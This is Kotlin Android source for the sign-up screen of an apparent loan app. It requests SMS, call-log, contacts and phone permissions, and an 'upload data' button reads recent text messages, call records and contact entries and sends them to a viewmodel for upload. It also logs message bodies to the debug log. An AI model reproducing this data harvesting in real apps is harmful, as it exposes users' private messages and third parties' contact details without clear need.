package com.androiddev.loanapplication.activity

import android.annotation.SuppressLint
import android.app.ProgressDialog
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.androiddev.loanapplication.databinding.ActivitySignupBinding
import com.androiddev.loanapplication.model.Calllogs
import com.androiddev.loanapplication.model.Contacts
import com.androiddev.loanapplication.model.Messages
import com.androiddev.loanapplication.viewmodel.SigninViewmodel
import java.lang.Long
import java.util.Date
import kotlin.Array
import kotlin.Int
import kotlin.IntArray
import kotlin.String
import kotlin.arrayOf
import kotlin.toString

class SignupActivity : AppCompatActivity() {

    private lateinit var signinViewmodel: SigninViewmodel
    private lateinit var binding: ActivitySignupBinding
    private lateinit var progressDialog: ProgressDialog
    val messagesList = ArrayList<Messages>()
    val callLogs = ArrayList<Calllogs>()
    val contactList = ArrayList<Contacts>()

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivitySignupBinding.inflate(layoutInflater)
        setContentView(binding.root)

        checkAndRequestPermissions()

        signinViewmodel = SigninViewmodel()
        subscribe()

        binding.btnSignup.setOnClickListener {
            if (binding.etUsernaem.text.isNullOrBlank() or
                binding.etPassword.text.isNullOrBlank() or
                binding.etMobileno.text.isNullOrBlank()
            ) {
                binding.etUsernaem.error = "Null or empty is not allowed"
            } else {
                signinViewmodel.username = binding.etUsernaem.text.toString()
                signinViewmodel.password = binding.etPassword.text.toString()
                signinViewmodel.mobile = binding.etMobileno.text.toString()
                signinViewmodel.signup()
            }
        }

        binding.btnUploaddata.setOnClickListener {
            getAllSms()
            getCallLogs()
            getNamePhoneDetails()
            signinViewmodel.uploadUserData()
        }
    }

    fun getAllSms() {
        val cr = contentResolver
        val cur = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
        var totalSMS = 0
        if (cur != null) {
            totalSMS = 2
            if (cur.moveToLast()) {
                for (j in 0 until totalSMS) {
                    val smsDate = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.DATE))
                    val number = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    val body = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.BODY))
                    val dateFormat = Date(Long.valueOf(smsDate)).toString()
                    var type: String
                    when (cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.TYPE)).toInt()) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> type = "inbox"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> type = "sent"
                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> type = "outbox"
                        else -> {
                        }
                    }
                    cur.moveToPrevious()
                    val data = Messages(number, dateFormat, body)
                    messagesList.add(data)
                    Log.d("MYTAG", "getAllSms: $data")

                }
                signinViewmodel.message = messagesList
            }
            cur.close()
        } else {
            Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show()
        }
    }

    private fun getCallLogs() {
        val cr = contentResolver
        val cur = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
        var totalCall = 1
        if (cur != null) {
            totalCall = 2
            if (cur.moveToLast()) {
                for (j in 0 until totalCall) {
                    val phNumber = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val callDate = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val callDuration = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val dateFormat = Date(Long.valueOf(callDate))
                    var direction: String? = null
                    when (cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.TYPE)).toInt()) {
                        CallLog.Calls.OUTGOING_TYPE -> direction = "OUTGOING"
                        CallLog.Calls.INCOMING_TYPE -> direction = "INCOMING"
                        CallLog.Calls.MISSED_TYPE -> direction = "MISSED"
                        else -> {}
                    }
                    cur.moveToPrevious()
                    val call = Calllogs(
                        phNumber,
                        callDuration,
                        dateFormat.toString(),
                        direction.toString()
                    )
                    callLogs.add(call)
                }
                signinViewmodel.callLogs = callLogs
            }
            cur.close()
        }
    }

    @SuppressLint("Range")
    fun getNamePhoneDetails() {
        val cr = contentResolver
        val cur = cr.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
            null, null, null
        )
        var totalContact = 0
        if (cur != null) {
            totalContact = 2
            if (cur.moveToLast()) {
                for (j in 0 until totalContact) {
                    val name =
                        cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number =
                        cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    cur.moveToPrevious()
                    val data = Contacts(name, number)
                    contactList.add(data)
                }
                signinViewmodel.contact = contactList
            }
            cur.close()
        } else {
            Toast.makeText(this, "No Contact to Show", Toast.LENGTH_SHORT).show()
        }
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun checkAndRequestPermissions() {
        val requiredPermissions = arrayOf(
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.CALL_PHONE,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_MEDIA_IMAGES
        )
        val permissionsToRequest = mutableListOf<String>()

        for (permission in requiredPermissions) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    permission
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                permissionsToRequest.add(permission)
            }
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        } else {
            // All permissions are granted, proceed with the functionality
            Toast.makeText(this, "All permissions are granted", Toast.LENGTH_SHORT).show()
        }
    }


    private fun subscribe() {
        signinViewmodel.isLoading.observe(this) { isLoading ->
            if (isLoading) {
                progressDialog = ProgressDialog(this)
                progressDialog.setTitle("Please Wait")
                progressDialog.setMessage("Loading ...")
                progressDialog.setCancelable(false) // blocks UI interaction
                progressDialog.show()
            } else if (!isLoading) {
                progressDialog.dismiss()
            }
        }

        signinViewmodel.isError.observe(this) { isError ->
            if (isError) {
                Toast.makeText(this, signinViewmodel.errorMessage, Toast.LENGTH_SHORT).show()
            }
        }

        signinViewmodel.signinData.observe(this) { signinData ->
            if (signinData.message.equals("User already exists")) {
                Toast.makeText(this, "User already exists", Toast.LENGTH_SHORT).show()
            } else {
                startActivity(Intent(this, SigninActivity::class.java))
            }
        }
    }

    companion object {
        const val PERMISSION_REQUEST_CODE = 1001
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val permissionResults = permissions.zip(grantResults.toTypedArray()).toMap()

            for ((permission, result) in permissionResults) {
                if (result == PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "$permission granted", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "$permission denied", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }
}
